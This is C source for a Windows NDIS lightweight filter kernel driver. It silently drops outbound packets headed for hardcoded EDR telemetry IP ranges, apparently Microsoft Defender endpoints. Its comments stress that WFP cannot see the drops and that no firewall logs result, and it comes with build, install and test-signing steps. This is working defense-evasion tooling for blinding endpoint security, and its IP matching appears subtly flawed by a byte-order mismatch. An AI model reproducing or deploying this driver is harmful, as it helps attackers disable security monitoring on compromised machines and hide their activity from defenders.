/*
 * ndis_lwf.c
 * NDIS Lightweight Filter (LWF) Driver — silent packet drop
 *
 * An NDIS LWF driver sits between the NDIS protocol drivers (tcpip.sys)
 * and the miniport (NIC driver). It sees raw Ethernet frames.
 * At this level, WFP has NO visibility — packets dropped here generate
 * zero WFP events, zero firewall logs.
 *
 * This driver:
 *   - Attaches to all adapters automatically (NDIS_FILTER_ATTRIBUTE_xxx)
 *   - Intercepts FilterSendNetBufferLists (outbound path)
 *   - Checks the destination IP against a hardcoded EDR IP list
 *   - Drops matching NBLs silently (calls NdisFSendNetBufferListsComplete)
 *
 * For inbound, intercept FilterReceiveNetBufferLists and call
 * NdisFReturnNetBufferLists to drop.
 *
 * Build: WDK 10, x64
 *   msbuild ndis_lwf.vcxproj /p:Configuration=Release /p:Platform=x64
 *
 * Install:
 *   INF-based install via pnputil + NDIS filter class
 *   (See ndis_lwf.inf)
 *
 * IMPORTANT: Requires kernel driver signing for production use.
 *            For research: bcdedit /set testsigning on
 */

#include <ntddk.h>
#include <ndis.h>
#include <wdm.h>

#pragma warning(disable: 4100) /* unreferenced parameter */

/* ---- Configuration ---- */

#define LWF_MAJOR_VERSION    6
#define LWF_MINOR_VERSION    0

/* EDR IPs to block — in network byte order (big endian).
 * 13.107.x.x = Microsoft Azure endpoints commonly used by MDE.
 * Add more CIDRs as needed.
 */
#define EDR_PREFIX_COUNT 4
static const ULONG EDR_PREFIXES[EDR_PREFIX_COUNT]  = {
    0x0D6B0000,  /* 13.107.x.x  (0x0D = 13, 0x6B = 107) */
    0x14000000,  /* 20.x.x.x    (20 = 0x14) */
    0x34A80000,  /* 52.168.x.x */
    0x34B80000,  /* 52.184.x.x */
};
static const ULONG EDR_MASKS[EDR_PREFIX_COUNT] = {
    0xFFFF0000,  /* /16 for 13.107.x.x */
    0xFF000000,  /* /8  for 20.x.x.x */
    0xFFFF0000,  /* /16 for 52.168.x.x */
    0xFFFF0000,  /* /16 for 52.184.x.x */
};

/* ---- NDIS filter driver globals ---- */

static NDIS_HANDLE g_FilterDriverHandle = NULL;
static NDIS_HANDLE g_FilterHandle       = NULL;  /* for single-adapter; real drivers use list */

/* ---- Helpers ---- */

#define ETH_HEADER_LEN   14
#define IP_PROTO_OFFSET   9   /* byte offset of Protocol field in IPv4 header */
#define IP_DST_OFFSET    16   /* byte offset of Destination IP in IPv4 header */
#define ETH_TYPE_IPV4  0x0800

typedef struct _ETH_HDR {
    UCHAR  DstMac[6];
    UCHAR  SrcMac[6];
    USHORT EtherType;   /* big-endian */
} ETH_HDR;

/* Check if destination IP in the NBL matches an EDR prefix */
static BOOLEAN IsEdrPacket(PNET_BUFFER_LIST nbl)
{
    PNET_BUFFER nb = NET_BUFFER_LIST_FIRST_NB(nbl);
    if (!nb) return FALSE;

    ULONG dataLen = NET_BUFFER_DATA_LENGTH(nb);
    if (dataLen < ETH_HEADER_LEN + 20) return FALSE; /* too small for Eth+IPv4 */

    /* Map contiguous header — if fragmented, use NdisGetDataBuffer */
    PUCHAR pData = NdisGetDataBuffer(nb, ETH_HEADER_LEN + 20, NULL, 1, 0);
    if (!pData) return FALSE;

    ETH_HDR *eth = (ETH_HDR *)pData;

    /* Only process IPv4 */
    if (RtlUshortByteSwap(eth->EtherType) != ETH_TYPE_IPV4) return FALSE;

    /* Destination IP is at byte 16 of the IP header (after ETH header) */
    PUCHAR ipHdr = pData + ETH_HEADER_LEN;
    ULONG  dstIp = *(ULONG *)(ipHdr + 16); /* already network byte order */

    /* Compare against EDR prefixes */
    for (int i = 0; i < EDR_PREFIX_COUNT; i++) {
        if ((dstIp & EDR_MASKS[i]) == EDR_PREFIXES[i]) {
            return TRUE;
        }
    }
    return FALSE;
}

/* ---- NDIS Filter Handler: SendNetBufferLists (outbound) ---- */

static VOID FilterSendNetBufferLists(
    NDIS_HANDLE      filterModuleContext,
    PNET_BUFFER_LIST netBufferLists,
    NDIS_PORT_NUMBER portNumber,
    ULONG            sendFlags)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    UNREFERENCED_PARAMETER(portNumber);

    PNET_BUFFER_LIST pNbl      = netBufferLists;
    PNET_BUFFER_LIST pPassHead = NULL;
    PNET_BUFFER_LIST pPassTail = NULL;
    PNET_BUFFER_LIST pDropHead = NULL;
    PNET_BUFFER_LIST pDropTail = NULL;

    /* Split NBLs into pass-through vs drop lists */
    while (pNbl != NULL) {
        PNET_BUFFER_LIST pNext = NET_BUFFER_LIST_NEXT_NBL(pNbl);
        NET_BUFFER_LIST_NEXT_NBL(pNbl) = NULL;

        if (IsEdrPacket(pNbl)) {
            /* Append to drop list */
            if (!pDropHead) pDropHead = pNbl;
            else NET_BUFFER_LIST_NEXT_NBL(pDropTail) = pNbl;
            pDropTail = pNbl;

            NET_BUFFER_LIST_STATUS(pNbl) = NDIS_STATUS_FAILURE;
            DbgPrint("[NDIS_LWF] Dropped EDR packet\n");
        } else {
            /* Append to pass list */
            if (!pPassHead) pPassHead = pNbl;
            else NET_BUFFER_LIST_NEXT_NBL(pPassTail) = pNbl;
            pPassTail = pNbl;
        }

        pNbl = pNext;
    }

    /* Complete dropped NBLs back to sender */
    if (pDropHead) {
        NdisFSendNetBufferListsComplete(g_FilterHandle, pDropHead, 0);
    }

    /* Pass remaining NBLs down the stack */
    if (pPassHead) {
        NdisFSendNetBufferLists(g_FilterHandle, pPassHead, portNumber, sendFlags);
    }
}

/* ---- Mandatory NDIS filter handlers (stubs) ---- */

static NDIS_STATUS FilterAttach(
    NDIS_HANDLE                     ndisFilterHandle,
    NDIS_HANDLE                     filterDriverContext,
    PNDIS_FILTER_ATTACH_PARAMETERS  attachParameters)
{
    UNREFERENCED_PARAMETER(filterDriverContext);
    UNREFERENCED_PARAMETER(attachParameters);

    /* NdisFSetAttributes is MANDATORY — NDIS will fail the attach if not called */
    NDIS_FILTER_ATTRIBUTES attrs;
    NdisZeroMemory(&attrs, sizeof(attrs));
    attrs.Header.Type     = NDIS_OBJECT_TYPE_FILTER_ATTRIBUTES;
    attrs.Header.Revision = NDIS_FILTER_ATTRIBUTES_REVISION_1;
    attrs.Header.Size     = NDIS_SIZEOF_FILTER_ATTRIBUTES_REVISION_1;
    attrs.Flags           = 0;

    NDIS_STATUS st = NdisFSetAttributes(ndisFilterHandle,
                                         (NDIS_HANDLE)NULL,  /* per-module context */
                                         &attrs);
    if (st != NDIS_STATUS_SUCCESS) {
        DbgPrint("[NDIS_LWF] NdisFSetAttributes failed: 0x%08X\n", st);
        return st;
    }

    g_FilterHandle = ndisFilterHandle;
    DbgPrint("[NDIS_LWF] FilterAttach OK\n");
    return NDIS_STATUS_SUCCESS;
}

static VOID FilterDetach(NDIS_HANDLE filterModuleContext)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    DbgPrint("[NDIS_LWF] FilterDetach\n");
}

static NDIS_STATUS FilterRestart(
    NDIS_HANDLE                      filterModuleContext,
    PNDIS_FILTER_RESTART_PARAMETERS  restartParameters)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    UNREFERENCED_PARAMETER(restartParameters);
    DbgPrint("[NDIS_LWF] FilterRestart\n");
    return NDIS_STATUS_SUCCESS;
}

static NDIS_STATUS FilterPause(
    NDIS_HANDLE                    filterModuleContext,
    PNDIS_FILTER_PAUSE_PARAMETERS  pauseParameters)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    UNREFERENCED_PARAMETER(pauseParameters);
    DbgPrint("[NDIS_LWF] FilterPause\n");
    return NDIS_STATUS_SUCCESS;
}

static VOID FilterSendNetBufferListsComplete(
    NDIS_HANDLE      filterModuleContext,
    PNET_BUFFER_LIST netBufferLists,
    ULONG            returnFlags)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    NdisFSendNetBufferListsComplete(g_FilterHandle, netBufferLists, returnFlags);
}

static VOID FilterReceiveNetBufferLists(
    NDIS_HANDLE      filterModuleContext,
    PNET_BUFFER_LIST netBufferLists,
    NDIS_PORT_NUMBER portNumber,
    ULONG            numberOfNetBufferLists,
    ULONG            receiveFlags)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    /* Pass all inbound through (add drop logic here to also block inbound) */
    NdisFIndicateReceiveNetBufferLists(
        g_FilterHandle, netBufferLists,
        portNumber, numberOfNetBufferLists, receiveFlags);
}

static VOID FilterReturnNetBufferLists(
    NDIS_HANDLE      filterModuleContext,
    PNET_BUFFER_LIST netBufferLists,
    ULONG            returnFlags)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    NdisFReturnNetBufferLists(g_FilterHandle, netBufferLists, returnFlags);
}

static VOID FilterStatus(
    NDIS_HANDLE      filterModuleContext,
    PNDIS_STATUS_INDICATION statusIndication)
{
    UNREFERENCED_PARAMETER(filterModuleContext);
    NdisFIndicateStatus(g_FilterHandle, statusIndication);
}

/* ---- Driver unload ---- */

static VOID FilterDriverUnload(PDRIVER_OBJECT driverObject)
{
    UNREFERENCED_PARAMETER(driverObject);
    if (g_FilterDriverHandle)
        NdisFDeregisterFilterDriver(g_FilterDriverHandle);
    DbgPrint("[NDIS_LWF] Unloaded.\n");
}

/* ---- DriverEntry ---- */

NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
    UNREFERENCED_PARAMETER(registryPath);

    DbgPrint("[NDIS_LWF] Loading...\n");

    driverObject->DriverUnload = FilterDriverUnload;

    /* Fill out NDIS_FILTER_DRIVER_CHARACTERISTICS */
    NDIS_FILTER_DRIVER_CHARACTERISTICS chars;
    NdisZeroMemory(&chars, sizeof(chars));

    chars.Header.Type     = NDIS_OBJECT_TYPE_FILTER_DRIVER_CHARACTERISTICS;
    chars.Header.Revision = NDIS_FILTER_CHARACTERISTICS_REVISION_2;
    chars.Header.Size     = NDIS_SIZEOF_FILTER_DRIVER_CHARACTERISTICS_REVISION_2;

    chars.MajorNdisVersion = LWF_MAJOR_VERSION;
    chars.MinorNdisVersion = LWF_MINOR_VERSION;

    chars.MajorDriverVersion = 1;
    chars.MinorDriverVersion = 0;

    /* Service name must match INF FilterService */
    RtlInitUnicodeString(&chars.ServiceName, L"NdisEdrFilter");
    RtlInitUnicodeString(&chars.FriendlyName, L"EDR NDIS Filter");
    RtlInitUnicodeString(&chars.UniqueName,   L"{B1C2D3E4-0001-0001-0001-000000000001}");

    chars.SetOptionsHandler                     = NULL;
    chars.SetFilterModuleOptionsHandler         = NULL;
    chars.AttachHandler                         = FilterAttach;
    chars.DetachHandler                         = FilterDetach;
    chars.RestartHandler                        = FilterRestart;
    chars.PauseHandler                          = FilterPause;
    chars.StatusHandler                         = FilterStatus;
    chars.SendNetBufferListsHandler             = FilterSendNetBufferLists;
    chars.SendNetBufferListsCompleteHandler     = FilterSendNetBufferListsComplete;
    chars.ReceiveNetBufferListsHandler          = FilterReceiveNetBufferLists;
    chars.ReturnNetBufferListsHandler           = FilterReturnNetBufferLists;
    chars.OidRequestHandler                     = NULL;
    chars.OidRequestCompleteHandler             = NULL;
    chars.CancelSendNetBufferListsHandler       = NULL;
    chars.DevicePnPEventNotifyHandler           = NULL;
    chars.NetPnPEventHandler                    = NULL;
    chars.CancelOidRequestHandler               = NULL;

    NDIS_STATUS st = NdisFRegisterFilterDriver(
        driverObject,
        (NDIS_HANDLE)driverObject,
        &chars,
        &g_FilterDriverHandle
    );

    if (st != NDIS_STATUS_SUCCESS) {
        DbgPrint("[NDIS_LWF] NdisFRegisterFilterDriver: 0x%08X\n", st);
        return STATUS_UNSUCCESSFUL;
    }

    DbgPrint("[NDIS_LWF] Registered. Monitoring outbound packets.\n");
    return STATUS_SUCCESS;
}
